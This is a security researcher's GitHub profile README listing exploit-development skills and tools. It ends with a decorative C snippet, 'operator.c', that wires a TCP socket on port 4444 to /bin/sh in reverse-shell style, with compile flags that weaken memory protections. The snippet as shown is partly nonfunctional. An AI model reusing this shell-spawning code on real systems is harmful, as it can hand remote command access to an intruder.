<p align="center">
  <img src="assets/mascot.gif" width="80">
</p>

<div align="center">
  <pre>
     _     _       _   _     _       _    
 ___| |__ (_)_ __ | |_| |__ (_)_ __ | | __
/ __| '_ \| | '_ \| __| '_ \| | '_ \| |/ /
\__ \ | | | | | | | |_| | | | | | | |   < 
|___/_| |_|_|_| |_|\__|_| |_|_|_| |_|_|\_\
  </pre>
</div>

<h4 align="center">Vulnerability Research  ·  Exploit Development  ·  Reverse Engineering</h4>

<p align="center">
  <img src="https://komarev.com/ghpvc/?username=shinthink&color=555555&style=flat-square" alt="Views">
  <a href="https://github.com/shinthink"><img src="https://img.shields.io/github/followers/shinthink?label=Follow&style=social"></a>
</p>

---

<div align="center">

### About

Security researcher focused on **zero-day discovery** and **exploit development** for web applications and CMS platforms. Published multiple critical CVEs with a focus on pre-authentication attack vectors.

### Languages

<img src="https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white">
<img src="https://img.shields.io/badge/PHP-777BB4?style=flat-square&logo=php&logoColor=white">
<img src="https://img.shields.io/badge/C-00599C?style=flat-square&logo=c&logoColor=white">
<img src="https://img.shields.io/badge/Shell-4EAA25?style=flat-square&logo=gnubash&logoColor=white">
<img src="https://img.shields.io/badge/Go-00ADD8?style=flat-square&logo=go&logoColor=white">
<img src="https://img.shields.io/badge/MySQL-4479A1?style=flat-square&logo=mysql&logoColor=white">
<img src="https://img.shields.io/badge/Docker-2496ED?style=flat-square&logo=docker&logoColor=white">

### Tools

<img src="https://img.shields.io/badge/Burp_Suite-FF6633?style=flat-square&logo=burpsuite&logoColor=white">
<img src="https://img.shields.io/badge/Metasploit-222222?style=flat-square&logo=metasploit&logoColor=white">
<img src="https://img.shields.io/badge/Ghidra-FF0000?style=flat-square&logo=ghidra&logoColor=white">
<img src="https://img.shields.io/badge/Wireshark-1679A7?style=flat-square&logo=wireshark&logoColor=white">
<img src="https://img.shields.io/badge/nmap-004065?style=flat-square&logo=nmap&logoColor=white">
<img src="https://img.shields.io/badge/Kali_Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white">

</div>

---

```c
/*
 * operator.c — no symbols, no debug info, no mercy
 * compile: gcc -s -fno-stack-protector -z execstack
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#define PORT 4444

void _start() {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in sin = {
        .sin_family = AF_INET,
        .sin_port   = htons(PORT),
        .sin_addr   = { .s_addr = INADDR_ANY },
    };
    connect(sock, (struct sockaddr*)&sin, sizeof(sin));
    dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
    execve("/bin/sh", NULL, NULL);
}
```

<div align="center">

[![GitHub](https://img.shields.io/badge/GitHub-shinthink-181717?style=for-the-badge&logo=github)](https://github.com/shinthink)

<p>
  <sub>Research published for educational and authorized testing purposes only. CVEs under responsible disclosure.</sub>
</p>

</div>
